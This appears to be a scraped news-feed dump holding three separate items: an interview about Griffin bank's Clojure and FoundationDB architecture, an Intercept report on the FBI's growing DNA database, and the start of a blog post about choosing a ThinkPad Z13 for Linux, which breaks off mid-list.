<p><strong>Allen:</strong> We are a fully regulated UK bank. We call it <em>“the bank you can build on”</em>. That means we’re like AWS for banking. So there’s an API to onboard a customer, an API to create a bank account, an API to make a payment.</p>
<p>By law, fintechs must work with a bank to do these things, and right now that means a legacy high street bank with mainframes. Griffin is the bank <em>plus</em> technology platform that all future fintechs would build on.</p>
<p>We got our license in March and we’re still in what’s called ‘mobilization’, which is basically like training wheels. The training wheels come off when we complete an audit, raise some more money, and finish writing the code. That should be Q3 or Q4 this year.</p>
<p><strong>Joe: So presumably, the mission of Griffin would be to disrupt the market, have a more modern set of technologies, a better, faster delivery capability than some of the existing banks?</strong></p>
<p><strong>Allen:</strong> Yeah, exactly. We kind of joke that we’re a tech company that happens to have a banking license.</p>
<p><strong>Joe: How did Clojure end up becoming the language of choice for the platform?</strong></p>
<p><strong>Allen:</strong> I mean, the flippant answer is: because I liked it. The serious answer is: Clojure is the right choice because it’s immutable, it’s powerful; it’s a good fit for financial services and anything that needs an audit log.</p>
<span text-content="Clojure is the right choice because it’s immutable, it’s powerful; it’s a good fit for financial services and anything that needs an audit log."></span>
<p>There is a longer story about how I arrived at Clojure. I graduated from college (you UK folks would say ‘university’) in 2005, and I got a boring enterprise software job and, uh, was pretty unhappy with it. Then I started reading Paul Graham, and he was writing about how you should both start a startup and work in Lisp. And so I said, Hey, let’s do both of those. At the time he was saying, don’t use Common Lisp because it’s old, fragmented, and there wasn’t a good implementation that did everything. There was like one implementation that was good at threads and another implementation that was good at, let’s say, graphics. And if you wanted to do graphics and threads, you were outta luck. He was saying, <em>“Wait, wait, I’m gonna work on this”</em>.</p>
<p>The problem with Common Lisp is that it needed a BDFL like Python, and there wasn’t one yet. And so PG was saying, well, <em>“I’ll start Arc”</em>, but he’d been talking about that for multiple years. So then I started writing my own Lisp, got about halfway into it, and then I saw that Rich released Clojure. That was probably 2007 - one of his first announcements.</p>
<p>I looked at Clojure and I said, <em>“Well, that’s way better than what I would’ve written”</em>. So then I did a startup that didn’t go anywhere, and then I founded CircleCI in 2011. This is also getting into the history of Griffin as well. I hired David [Jarvis], my co-founder at Griffin, as engineer number nine or so at CircleCI.</p>

<img alt="Griffin Founders, Allen Rohner and David Jarvis" width="600" height="400" src="https://www.juxt.pro/_astro/griffin-founders.0ea6690e_Z3zqd4.jpg" loading="lazy" decoding="async">
<p>David later went on to work at Standard Treasury, which was a YC company that was trying to sell modern APIs to US banks. That ended up not working out. Too late in Standard Treasury’s runway, they said, <em>“Instead of trying to sell the banks, let’s <em>become</em> a bank”</em>. They figured that out too late. David always liked the idea and he saw Monzo get authorized in 2017. He said, <em>“Well, if Monzo can get authorized for this retail bank, then we can get authorized for this tech infrastructure bank”</em>.</p>
<p>So, by this point, I’d been using Clojure for a decade and it worked great at CircleCI and it was a very good fit for financial services.</p>
<p><strong>Joe: So you were coming to Clojure from a Lisp background. Had you worked with JVM languages before that?</strong></p>
<p><strong>Allen:</strong> Not really. I had, maybe, three months of Java before using Clojure. Before that my prior experience was C and C++, Python, and Ruby.</p>
<p><strong>Joe: So did you see the JVM as a benefit or a drawback? People talk about the ‘JVM tax’ (on resources like memory). Were you thinking that way?</strong></p>
<p><strong>Allen:</strong> I did at first, but my perspective has changed. For the first couple of years I didn’t appreciate it [the JVM]. But now I’ve seen other niche startup languages try to grow, and they run into the library problems and run into problems making the compiler and the runtime fast. It’s become obvious to me that the JVM is a huge benefit.</p>
<span text-content="[N]ow I've seen other niche startup languages try to grow, ... it's become obvious to me that the JVM is a huge benefit."></span>
<p><strong>Joe: When you were working on CircleCI and also when you were starting Griffin, were you mindful that this choice of language and technology would have an impact? Did you feel that using Clojure said something about the business?</strong></p>
<p><strong>Allen:</strong> Yeah, I think it definitely says something about the company, something I thought was good.</p>
<p>If we had picked Python, it’s very boring and reliable, and the same could be said of Java. But you’re picking the lowest common denominator. I would say high performers, and the best programmers are often people that will only work in niche languages.</p>
<p>The problem is, there are good Java programmers, but there are also thousands of terrible Java programmers. If you pick the right niche, it’s easier to find the high-end talent. I think Paul Graham also made a very strong case that in a startup, you should be using the most powerful language you can, and that is Clojure.</p>
<h2 id="foundationdb">FoundationDB</h2>
<p><strong>Joe: How would you describe the architecture of the Griffin platform?</strong></p>
<p><strong>Allen:</strong> We’re running Clojure on Kubernetes, on AWS, and we are almost entirely event sourcing.</p>
<p>The database is <a href="https://www.foundationdb.org/">FoundationDB</a>, and this additional proprietary thing that I really need to open source (I ported Datascript to FoundationDB). It’s a Datomic-like layer that writes directly to Foundation. I should talk about Foundation, cause it’s awesome.</p>
<p>FoundationDB is a strict-serializable key value store that supports transactions. It was originally a Silicon Valley startup and then got acquired by Apple in 2015. It kind of disappeared, and then Apple re-open-sourced it around 2018.</p>
<p>Apple uses it in production for iCloud. They’ve benchmarked it running like a million transactions a second. It’s strict serializable, which means that it’s at the <a href="https://jepsen.io/consistency">highest correctness level for databases</a>.</p>
<p>So Foundation is a very good database. It’s very fast, and it’s intentionally built to be built upon. The normal API is just ‘get a key’, ‘set a key’. It’s not SQL. I ported Datascript to that. So now we have atomic queries, reading and writing on this strict serializable data store with transactions.</p>
<p>The database supports concurrent writes (not a single writer), and we need to go over a thousand transactions per second, so we’re very happy with that.</p>

<img alt="Griffin teamwork" width="600" height="400" src="https://www.juxt.pro/_astro/griffin-dev.c17526da_1xglE.jpg" loading="lazy" decoding="async">
<h2 id="event-sourcing">Event-sourcing</h2>
<p><strong>Allen:</strong> We also have an event sourcing model. Every input to the system is an event. So like every API request, every webhook from a third party, it turns into an event. Those go into a message log. For us an event is just a Clojure map with a type field and some keys, values, and specs.</p>
<p>The entire system is just reactions to events. We have these small log processors, or ‘procs’ for short. The proc declares <em>“I listen for message type A, and then in response to that, I will emit either B or C”</em>. And each one has its own little private state.</p>
<p>You can build up a graph of how the messages flow through the system. Events will flow until you reach a terminal node in the graph. For example, a web server says, <em>“I will receive http events and write them. Please make a payment and I will listen for either payment created event or a payment rejected event. When I see one of those, I will respond back to the client”</em>. That’s a Netty asynchronous http handler, so an asynchronous payment response back to the client.</p>
<p><strong>Joe: So you have many independent procs all receiving and acting on those events, and producing their own. Yeah. How are those events conveyed?</strong></p>
<p><strong>Allen:</strong> They’re all written to Foundation, so they go into the log there and each little log processor has its own private data, like its own namespace in the database, where they emit messages. The procs are watching in Foundation for a certain type of event to be written, and they are writing their own events back to Foundation. Foundation has a feature for watching when DB keys change, so it’s efficient to build a reactive system on top of that.</p>
<p>If you had a database and some separate messaging like ZeroMQ, Rabbit, Kafka, you’re going to get race conditions. There’s always going to be a potential race where you have two messages - one is going to the disk and one is going to the network. If someone else is listening and sees both of them, they could potentially get them in either order. So it’s much, much simpler to just have one path. Foundation is really fast, so it works great.</p>
<p><strong>Joe: Do you have log processors as independent services, or are things more monolithic?</strong></p>
<p><strong>Allen:</strong> It’s a monorepo. And right now many log processes run in the same JVM for efficiency. They are independent, so they could be run each one in its own JVM process, but right now we’re running low hundreds of them in a single JVM.</p>
<p>One architectural choice that we made that I highly, highly recommend is: Keep your business logic as dumb and clean as possible. For these individual log processors, if you look at the namespace, it’s almost entirely pure Clojure. No third-party libraries, and very few side effects.</p>
<span text-content="One architectural choice that we made that I highly, highly recommend is: Keep your business logic as dumb and clean as possible... We have a function that takes a Clojure map in and I write a Clojure map out."></span>
<p>A log processor is function that takes a Clojure map in and returns one or more Clojure maps out. There’s a protocol for proc state, but it’s a protocol so you don’t know what’s on the other side of that. So yeah, keep the business logic as clean as possible, with as few dependencies as possible, and then interact with the outside world via protocols.</p>
<p>So for example, for the proc state protocol, it could either write to an in-memory database, or it can write to Foundation. It’s great because you can change out your implementation at test time.</p>
<p><strong>Joe: I see. I guess there are two patterns that people often use, aren’t there?</strong></p>
<p><strong>One is keeping all interactions with the outside world at the outer edges (e.g. functional core, imperative shell). Another is more like dependency injection, where we interact with the outside world from anywhere, but put in some abstractions, so that we can swap out the implementation.</strong></p>
<p><strong>So you’re doing the latter? You <em>do</em> allow those interactions to happen within the business logic, but you make sure to always have a protocol in front of those interactions so that you can swap out the implementation.</strong></p>
<p><strong>Allen:</strong> Exactly. Also, the interface to the outside world is as small as possible.</p>
<p>For the vast majority of procs, the only thing they can do is write to their own internal state and emit messages. That’s it. They can’t make network calls. They can’t call AWS. They don’t do anything else. So when we do wanna talk to the outside world, there’s a special kind of proc that has a dispatch handler that is dedicated to talk to that external system. So, this one talks to AWS, this one talks to our clearing bank, this one talks to some other API.</p>
<p>That separation is very useful.</p>
<h2 id="libraries">Libraries</h2>
<p><strong>Joe: What’s the typical selection of libraries and things from the Clojure ecosystem that you’re using?</strong></p>
<p><strong>Allen:</strong> So in the business logic itself, very little. Outside of that, for instance in the API web server or the service gateway (where we talk to the outside world), it’s ring, netty, reitit. We’re using Clojure spec extensively. For AWS we’re using the Cognitect aws-api library.</p>
<p><strong>Joe: And do you use any library for managing the parts that interact with the outside world? Dependency injection or wiring up the application?</strong></p>
<p><strong>Allen:</strong> The thing we use is based on a blog post called <a href="https://medium.com/@maciekszajna/reloaded-workflow-out-of-the-box-be6b5f38ea98">closeable</a>. It’s great.</p>
<p>Five years ago, this guy wrote a blog post. His argument was that you don’t need Component or Integrant, or any of that. All you need is <code>with-open</code>. You get lexical scope, you get the right-hand side of declaring your bindings to construct things. And then because of how the introduction of bindings works, it forces you to declare your things in order.</p>
<span text-content="[Y]ou don't need Component or Integrant, or any of that. All you need is with-open."></span>
<p>There’s a couple of little helpers. One of them is for things that have state but don’t implement <code>Closeable</code>, or for things that are stateless, so you can declare them in the <code>with-open</code> block.</p>
<p>And so that’s it. You’re done. It’s very simple, and very clean.</p>
<h2 id="hiring">Hiring</h2>
<p><strong>Joe: You spoke earlier about how, often, the best programmers work in niche languages and it means that using marks your business out. How do you find hiring and finding good engineers? Do you have any issues?</strong></p>
<p><strong>Allen:</strong> I’m really happy with it. I joke about it sometimes, but it’s not a joke, it’s real: if we said we were hiring for Java programmers, we’d get like a thousand CVs and you’d have 10 good ones. If we’re hiring for Clojure, we’ll get 13 CVs and 10 good ones. You’re going to find high quality people and you’re gonna do less work for it.</p>
<p>We’re also remote, which I think is important because when you’re dealing with a smaller hiring pool, and you also constrain to geography, that’s hard. If you’re a remote company, then your hiring pool is, either everyone on earth or everyone within three time zones, or everyone in Europe, whatever. You’re at a good sized pool.</p>
<p><strong>Joe: Yes, and it’s very rare that a company needs to hire, say, a hundred engineers in a short space of time.</strong></p>
<p><strong>Allen:</strong> Yeah, I think that’s an anti-pattern.</p>
<p><strong>Joe: What’s the size of your team at the moment? And what is that geographical split?</strong></p>
<p><strong>Allen:</strong> There are maybe 70 in the company, and 22-24 or so in Engineering.</p>
<p>In engineering, it’s maybe two thirds in the UK and then a third in the EU. We’ve got, say, four in Germany, four in Sweden, one in Ireland. And then people over most of the UK. Our headquarters are in London, but most of the developers are in the UK <em>outside</em> of London.</p>

<img alt="The Griffin Team" width="600" height="400" src="https://www.juxt.pro/_astro/griffin-team.2ec5c1ae_Z11BDED.jpg" loading="lazy" decoding="async">
<h2 id="testing-for-correctness">Testing for correctness</h2>
<p><strong>Joe: How do you feel about the direction of Clojure at the moment? Are there things that you would like to see happen in the Clojure space? (either in the core or in the ecosystem). Is there anything that you feel is missing, or any new direction you are interested to go in?</strong></p>
<p><strong>Allen:</strong> So a thing I’ve been banging around for a while, but haven’t really made any progress on yet is around testing of systems. The FoundationDB team have a great video on how they do testing, but the problem is that this approach is hard to do as a library.</p>
<p>Foundation is a distributed system and almost every system that any of us work with on the internet today is a distributed system. Cause, you know, even if you have one process talking to AWS, then congratulations, you’re now a networked system!</p>
<p>So there are two big problems that we have to deal with. One of them is race conditions, and the other is system errors. As a bank we have to be what is called ‘operationally resilient’, which really just means no downtime. But we’re dealing with people’s money, so we have to actually prove it. So, don’t go down, and when there is a problem, how do you prove that you’re not losing people’s money?</p>
<p>What the Foundation team did was build a simulator of the database. They have something like 20 different process types, so 20 different ‘roles’ within the Foundation cluster, and they wrote them as single-threaded C++ apps. Then they built an actor-model concurrency compiler on top of C++. Every single system call or network call that they make goes through a protocol, so they can inject errors. All of their multi-threading also happens through this actor model with the sending of messages.</p>
<p>With all this in place, they can then say, <em>“Oh, what happens if I send message A and then send message B, but then on the other end it arrives B and then A?”</em>. Or <em>“What happens if, in the middle of processing this message, I try to write to disk and I get an error?”</em>. They can inject errors anywhere in the system, deterministically.</p>
<p>You can think of it as kind of like test.check generative testing, where you have all non-determinism in the system seeded from a single random number that you control. You can control disk errors, network errors, and reordering of messages. I’m really interested in having something like that.</p>
<p>The problem right now is that there’s no way to control the behavior of the underlying Java threading libraries, nio, and writing to disk.</p>
<p><strong>Joe: Similar to Jepsen, in a way, where you can enumerate all of the possible error scenarios for a complex, distributed system, but rather than just controlling the environment to disconnect the network or stop writes to the disk, you also have total control over things like thread scheduling to enumerate all the possible internal outcomes too?</strong></p>
<p><strong>Allen:</strong> Yeah. It is very much in the same spirit as Jepsen. In Jepsen you set up like five VMs and say, <em>“Oh, well maybe I’ll kill this process”</em>, and maybe that turns up a bug and maybe it doesn’t. Jepsen is very ‘brute force’, and it’s hard to know when you’re done because you can’t inspect the database’s state, so you don’t know how much coverage you’re getting. How many times do you have to do it before you’re confident that you don’t have any bugs there?</p>
<p>The difference, if you have this environment where you have total control, is that you can enumerate system calls, or say, for all possible interleavings of messages, make sure this thing happens. And because it’s in memory, it’s extremely fast.</p>
<p><strong>Joe: Have you seen this going on successfully outside of Clojure and the JVM?</strong></p>
<p><strong>Allen:</strong> No. I don’t know if anyone is doing it aside from the FoundationDB team. They started and built that on day one. I think in the video they said they had that built before they were even writing database tables to disk. This is the kind of thing that gives us a lot of confidence in FoundationDB.</p>
<p><strong>Joe: Thanks a lot for speaking with us Allen. Finally, are you hiring?</strong></p>
<p><strong>Allen</strong>: We tend to go into a bit of a lull on interviewing during the summer due to holiday, but yes we’re hiring. Check out the <a href="https://griffin.com/careers">Griffin careers page</a> for info.</p>
    </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The FBI Has Collected DNA Profiles for 21M People (116 pts)]]></title>
            <link>https://theintercept.com/2023/08/29/fbi-dna-collection-surveillance/</link>
            <guid>37312647</guid>
            <pubDate>Tue, 29 Aug 2023 19:27:05 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://theintercept.com/2023/08/29/fbi-dna-collection-surveillance/">https://theintercept.com/2023/08/29/fbi-dna-collection-surveillance/</a>, See on <a href="https://news.ycombinator.com/item?id=37312647">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    
    
<p><span>The FBI has</span> amassed 21.7 million DNA profiles — equivalent to about 7 percent of the U.S. population — according to <a href="https://le.fbi.gov/science-and-lab/biometrics-and-fingerprints/codis/codis-ndis-statistics">Bureau data</a> reviewed by The Intercept.</p>



<p>The FBI aims to nearly double its current $56.7 million budget for dealing with its DNA catalog with an additional $53.1 million, according to its <a href="https://www.justice.gov/d9/2023-03/fbi_fy_24_pb_bud_sum_ii_omb_cleared_3-08-23.pdf">budget request</a> for fiscal year 2024. “The requested resources will allow the FBI to process the rapidly increasing number of DNA samples collected by the U.S. Department of Homeland Security,” the appeal for an increase says.</p>



<!-- BLOCK(pullquote)[0](%7B%22componentName%22%3A%22PULLQUOTE%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%22pull%22%3A%22right%22%7D) --><blockquote data-shortcode-type="pullquote" data-pull="right"><!-- CONTENT(pullquote)[0] -->“When we’re talking about rapid expansion like this, it’s getting us ever closer to a universal DNA database.”<!-- END-CONTENT(pullquote)[0] --></blockquote><!-- END-BLOCK(pullquote)[0] -->



<p>In an April 2023 statement submitted to Congress to explain the budget request, FBI Director Christopher Wray cited several factors that had “significantly expanded the DNA processing requirements of the FBI.” He said the FBI collected around 90,000 samples a month — “over 10 times the historical sample volume” — and expected that number to swell to about 120,000 a month, totaling about 1.5 million new DNA samples a year. (The FBI declined to comment.)</p>



<div><p>The staggering increases are raising questions among civil liberties advocates.</p><p>“When we’re talking about rapid expansion like this, it’s getting us ever closer to a universal DNA database,” Vera Eidelman, a staff attorney at the American Civil Liberties Union who specializes in genetic privacy, told The Intercept. “I think the civil liberties implications here are significant.”</p></div>



<p>The rapid growth of the FBI’s sample load is in large part thanks to a Trump-era rule change that mandated the collection of DNA from migrants who were arrested or detained by immigration authorities. </p>



<!-- BLOCK(newsletter)[1](%7B%22componentName%22%3A%22NEWSLETTER%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%7D) -->

<!-- END-BLOCK(newsletter)[1] -->



<h2 id="h-mission-creep-in-fbi-s-dna">Mission Creep in FBI’s DNA</h2>



<p>The FBI began building a DNA database as early as 1990. By 1998, it helped create a national database called Combined DNA Index System, or CODIS, that spanned all 50 states. Each state maintained its own database, with police or other authorities submitting samples based on their states’ rules, and CODIS allowed all the states to search across the entire country. At first, the collection of data was limited to DNA from people convicted of crimes, from crime scenes, and from unidentified remains.</p>



<p>Even those categories were <a href="https://www.nytimes.com/1998/10/12/us/fbi-set-to-open-its-dna-database-for-fighting-crime.html">controversial at the time</a>. When CODIS was launched nationally, most states did not submit DNA from all people convicted of felonies; the only point of consensus among the states’ collection programs was to take DNA from convicted sex offenders.</p>



<p>“If you look back at when CODIS was established, it was originally for violent or sexual offenders,” Anna Lewis, a Harvard researcher who specializes in the ethical implications of genetics research, told The Intercept. “The ACLU warned that this was going to be a slippery slope, and that’s indeed what we’ve seen.”</p>



<p>Today, police have <a href="https://aizmanlaw.com/can-police-force-give-dna-sample-arrested/#:~:text=Police%20in%20all%2050%20states,never%20convicted%20of%20the%20offense.">the authority</a> to take DNA samples from anyone sentenced for a felony charge. In 28 states, police can take DNA samples from suspects arrested for felonies but who have not been convicted of any crime. In <a href="https://theintercept.com/2021/07/03/orange-county-prosecutors-dna-surveillance/">some cases</a>, police offer plea deals to reduce felony charges to misdemeanor offenses in exchange for DNA samples. Police are even acquiring DNA samples from unwitting people, as The Intercept <a href="https://theintercept.com/2023/08/18/gedmatch-dna-police-forensic-genetic-genealogy/">recently reported</a>.</p>



<p>“It changed massively,” Lewis said of the rules and regulations around government DNA collection. “You only have to be a person of interest to end up in these databases.”</p>



<p>The database is likely to continue proliferating as DNA technology becomes more sophisticated, Lewis explained, pointing to the advent of <a href="https://www.nytimes.com/2023/05/15/science/environmental-dna-ethics-privacy.html">environmental DNA</a>, which allows for DNA to be collected from ambient settings like wastewater or air.</p>



<p>“Just by breathing, you’re discarding DNA in a way that can be traced back to you,” Lewis said.</p>


<!-- BLOCK(promote-related-post)[2](%7B%22componentName%22%3A%22PROMOTE_RELATED_POST%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%22relatedPostNumber%22%3A1%7D) -->

<!-- END-BLOCK(promote-related-post)[2] -->



<p>While this might sound like science fiction, the federal government has already embraced the technology. In May, the National Oceanic and Atmospheric Administration offered <a href="https://sam.gov/opp/d3d52d3abced4f9281085b858703df70/view">a contract</a> for laboratory services to assist with “autonomously collected eDNA testing”: environmental DNA testing based on samples that are no longer even manually collected.</p>



<p>Until recently, the U.S. DNA database surpassed even that of authoritarian China, which launched an ambitious DNA collection program in 2017. That year, the BBC <a href="https://www.bbc.com/news/world-asia-china-39945220">reported</a>, the U.S. had about 4 percent of its population’s DNA, while China had about 3 percent. Since then, China announced a plan aimed at collecting between 5 and 10 percent of its male population’s DNA, according to a 2020 <a href="https://www.nytimes.com/2020/06/17/world/asia/China-DNA-surveillance.html">study</a> cited by the New York Times.</p>



<p>China has a record of abusing its DNA database for surveillance and crackdowns on dissent. The efforts have been aided by <a href="https://theintercept.com/2021/02/18/oracle-china-police-surveillance/">American technology</a> and <a href="https://theintercept.com/2022/09/13/china-tibet-police-dna-thermo-fisher/">expertise</a>. In 2021, the U.S. intelligence community <a href="https://www.nytimes.com/2021/10/22/us/politics/china-genetic-data-collection.html">raised alarms</a> about China’s widespread DNA collection, including foreigners’ genetic information.</p>


<!-- BLOCK(photo)[3](%7B%22componentName%22%3A%22PHOTO%22%2C%22entityType%22%3A%22RESOURCE%22%7D)(%7B%22scroll%22%3Afalse%2C%22align%22%3A%22bleed%22%2C%22bleed%22%3A%22xtra-large%22%2C%22width%22%3A%22auto%22%7D) --><div><!-- CONTENT(photo)[3] --> <p><img decoding="async" fetchpriority="high" width="2500" height="1667" src="https://theintercept.com/wp-content/uploads/2023/08/GettyImages-1531703467-fbi-christopher-wray.jpg?w=1024" alt="WASHINGTON, DC - JULY 12: FBI Director Christopher Wray testifies during a House Judiciary Committee hearing on &quot;oversight of the Federal Bureau of Investigation&quot; and alleged politicization of law enforcement on Capitol Hill in Washington, DC on July 12, 2023. (Photo by Shuran Huang for The Washington Post via Getty Images)" srcset="https://theintercept.com/wp-content/uploads/2023/08/GettyImages-1531703467-fbi-christopher-wray.jpg 2500w, https://theintercept.com/wp-content/uploads/2023/08/GettyImages-1531703467-fbi-christopher-wray.jpg?resize=300,200 300w, https://theintercept.com/wp-content/uploads/2023/08/GettyImages-1531703467-fbi-christopher-wray.jpg?resize=768,512 768w, https://theintercept.com/wp-content/uploads/2023/08/GettyImages-1531703467-fbi-christopher-wray.jpg?resize=1024,683 1024w, https://theintercept.com/wp-content/uploads/2023/08/GettyImages-1531703467-fbi-christopher-wray.jpg?resize=1536,1024 1536w, https://theintercept.com/wp-content/uploads/2023/08/GettyImages-1531703467-fbi-christopher-wray.jpg?resize=2048,1366 2048w, https://theintercept.com/wp-content/uploads/2023/08/GettyImages-1531703467-fbi-christopher-wray.jpg?resize=540,360 540w, https://theintercept.com/wp-content/uploads/2023/08/GettyImages-1531703467-fbi-christopher-wray.jpg?resize=1000,667 1000w" sizes="(max-width: 2500px) 100vw, 2500px"></p><p>FBI Director Christopher Wray testifies during a House Judiciary Committee hearing on Capitol Hill in Washington, D.C., on July 12, 2023.</p>
<p>
Photo: Shuran Huang for The Washington Post via Getty Images</p><!-- END-CONTENT(photo)[3] --></div><!-- END-BLOCK(photo)[3] -->


<h2>“Cheaper, Easier, and Faster”</h2>



<p>The changes detailed by Wray include shifts in statutory and regulatory requirements, with the bulk of new samples coming from a new policy mandating collection of DNA from people arrested or detained by U.S. Customs and Border Protection, a Department of Homeland Security agency. The new DHS policy, however, only explains part of the rapid growth of the FBI’s DNA database.</p>



<p>Whereas DNA analysis once had to be conducted in a lab by a cumbersome manual process of manually matching DNA strands that took months, the process has since been fully automated. Under <a href="https://le.fbi.gov/science-and-lab/biometrics-and-fingerprints/codis/rapid-dna">rapid DNA analysis</a>, a DNA profile can be developed in one to two hours after a simple swab of one’s inner cheek without a lab or human involvement.</p>



<p>“When surveillance technology gets cheaper, easier, and faster to use,” said Eidelman, of the ACLU, “it tends to get used more — often in ways that are troubling.”</p>



<!-- BLOCK(pullquote)[4](%7B%22componentName%22%3A%22PULLQUOTE%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%22pull%22%3A%22center%22%7D) --><blockquote data-shortcode-type="pullquote" data-pull="center"><!-- CONTENT(pullquote)[4] -->“When surveillance technology gets cheaper, easier, and faster to use, it tends to get used more — often in ways that are troubling.”<!-- END-CONTENT(pullquote)[4] --></blockquote><!-- END-BLOCK(pullquote)[4] -->



<p>In 2021, the FBI <a href="https://www.fbi.gov/news/press-releases/the-fbis-combined-dna-index-system-codis-hits-major-milestone">touted</a> as “a major milestone” the contribution of its 20 millionth DNA profile to the national DNA database, calling it “one of the most successful investigative tools available to U.S. law enforcement.”</p>



<!-- BLOCK(cta)[5](%7B%22componentName%22%3A%22CTA%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%7D) -->

<!-- END-BLOCK(cta)[5] -->



<p>While DNA has played an important role in prosecuting crimes, less than 3 percent of the profiles have assisted in cases, the Bureau’s <a href="https://le.fbi.gov/science-and-lab/biometrics-and-fingerprints/codis/codis-ndis-statistics">data reveals</a>. By comparison, fingerprints collected by the FBI from current and former federal employees linked them to crimes at a rate of 12 percent each year, the Bureau <a href="https://archives.fbi.gov/archives/news/testimony/fbi-fingerprint-program">testified in</a> 2004 — when fingerprint technology was far less sophisticated.</p>



<p>For civil liberties advocates, a government database of everyone’s DNA would be rife for abuses.</p>



<p>“A universal database really just would subvert our ideas of autonomy and freedom and the presumption of innocence. It would be saying that it makes sense for the government to track us at any time based on our private information,” Eidelman told The Intercept, adding that DNA collection presents specific risks to privacy. “Our DNA is personal and sensitive: It can expose our propensity for serious health conditions, family members, and ancestry.”</p>



<h2>DNA Collection From Migrants</h2>



<p>The bulk of the DHS increases stemmed from samples collected from the hundreds of thousands of migrants that ended up arrested or detained by Customs and Border Protection. With the end of <a href="https://theintercept.com/2023/05/14/title-42-arizona-asylum-seekers/">Title 42 expulsions</a>, a <a href="https://theintercept.com/2021/04/18/biden-border-patrol-asylum-title-42/">pandemic-era policy</a> that allowed the U.S. to <a href="https://theintercept.com/2021/04/21/asylum-seekers-violence-biden-title-42/">expel migrants without allowing them to apply for asylum</a> — which finally expired weeks after Wray’s April statement to Congress — the FBI director said he expected the number of new samples to swell to 120,000 a month. (CBP did not respond to a request for comment.)</p>



<p>“This substantial increase has created massive budget and personnel shortfalls for the FBI,” Wray said in his statement. “While the FBI has worked with DHS components to automate and streamline workflows, a backlog of approximately 650,000 samples has developed, increasing the likelihood of arrestees and non-U.S. detainees being released before identification through investigative leads.”</p>



<p>DHS initially sought to collect DNA from detainees in 2009, but the Obama administration <a href="https://www.oig.dhs.gov/sites/default/files/assets/2021-05/OIG-21-35-May21.pdf">exempted</a> the department from collection requirements for non-U.S. detainees. The task would have been too expensive, since Congress had not allocated funding for DNA collection, then-DHS Secretary Janet Napolitano explained.</p>



<p>In 2019, President Donald Trump’s administration ended the exemptions, and DHS <a href="https://www.nytimes.com/2019/10/02/us/dna-testing-immigrants.html">announced</a> that it would collect DNA samples from people arrested or detained by border authorities. At the time, Trump’s policy was widely condemned, including on the grounds that it could lead to widespread <a href="https://www.latimes.com/opinion/story/2019-10-12/trump-migrants-dna-civil-liberties">civil liberties violations</a>.</p>



<p>President Joe Biden has not reversed the decision, causing the government’s DNA database to balloon in size.<a></a></p>
  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I chose the ThinkPad Z13 Gen1 as my Linux laptop (136 pts)]]></title>
            <link>https://wimpysworld.com/posts/why-i-chose-the-thinkpad-z13-as-my-linux-laptop/</link>
            <guid>37312579</guid>
            <pubDate>Tue, 29 Aug 2023 19:21:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://wimpysworld.com/posts/why-i-chose-the-thinkpad-z13-as-my-linux-laptop/">https://wimpysworld.com/posts/why-i-chose-the-thinkpad-z13-as-my-linux-laptop/</a>, See on <a href="https://news.ycombinator.com/item?id=37312579">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>During the second half of 2022, I dusted off my laptop and travelled to three events for the first time in over two years. During these trips, it became apparent that my laptop is not the right tool for the job.</p><p>At <a href="https://events.linuxfoundation.org/archive/2022/kubecon-cloudnativecon-europe/">KubeCon EU 2022</a> my colleague Lindsay brought her <a href="https://www.apple.com/uk/macbook-pro-13/">Apple Macbook Pro M1</a>. It was lightweight, compact, looked fabulous and had epic battery life. Meanwhile, my ThinkPad P1 Gen 1 looked fabulous but it is a bit of a chonker and a massive power pig 🔌🐖 Battery anxiety was constant that week and also on my subsequent trips to <a href="https://www.sreday.com/">SREday 2022</a> and the <a href="https://events.canonical.com/event/2/">Ubuntu Summit 2022</a>. Sensing that 2022 wasn’t an outlier and more travel would be on the cards in 2023 I decided that I wanted some of that thin and light laptop action. In early December 2022, I went hunting for a Linux laptop and this is my journey.</p><h2 id="as-featured-on-linux-matters-">As featured on Linux Matters! 🎙️</h2><p>I recently discussed my hunt for a new Linux Loving Laptop on the <a href="https://linuxmatters.sh/">Linux Matters</a> podcast. <strong>You can hear that discussion with my friends Alan and Mark in <a href="https://linuxmatters.sh/1/">Linux Matters: Mastodon on My Résumé (Episode 1)</a></strong>.</p><p><a href="https://linuxmatters.sh/" target="_blank"><img src="https://linuxmatters.sh/img/episode/linuxmatters-banner-3000x750.webp" alt="Linux Matters Podcast"></a><br><em>Linux Matters Podcast</em></p><h2 id="past-laptop-purchasing-mistakes-">Past laptop purchasing mistakes 😱</h2><blockquote><p>“Those that fail to learn from history are doomed to repeat it” - Winston Churchill.</p></blockquote><p>The requirements for my last two laptop purchases were very different from what I need today; a <a href="https://www.dell.com/en-uk/shop/laptop-computers-2-in-1-pcs/precision-5550-mobile-workstation/spd/precision-15-5550-laptop">Dell XPS 15 5550</a> and <a href="https://www.lenovo.com/gb/en/p/laptops/thinkpad/thinkpadp/thinkpad-p1/22ws2wpp101">ThinkPad P1 Gen1</a> Both have significant power requirements with 15.6" UHD displays and discrete NVIDIA GPUs. The ThinkPad P1 Gen also sports a Xeon CPU ⚡️ These made sense when I bought them, I was travelling one week every month and regularly compiling large applications, building container images, VMs and operating system images. These days I have a <a href="https://www.amd.com/en/products/cpu/amd-ryzen-threadripper-3970x">Threadripper 3970X</a> workstation at home that I can connect to via <a href="https://tailscale.com/">Tailscale</a> to run compute-intensive tasks. I simply don’t need a workhorse 🐴 laptop anymore.</p><h3 id="laptop-criteria-">Laptop criteria 📑</h3><p>I’m deeply impressed with the outstanding work the <a href="https://asahilinux.org/">Asahi Linux</a> team are doing to enable Linux on Apple Silicon Macs, but running Linux on an M1 Mac isn’t viable for me as some hardware support (HDMI for example) is still a work in progress at the time of writing. Not ideal when you’re a conference speaker and running booth demos.</p><p>These are my criteria for the new laptop. Some must-haves, some nice-to-haves and some hard exclusions.</p><ul><li>Fully Linux 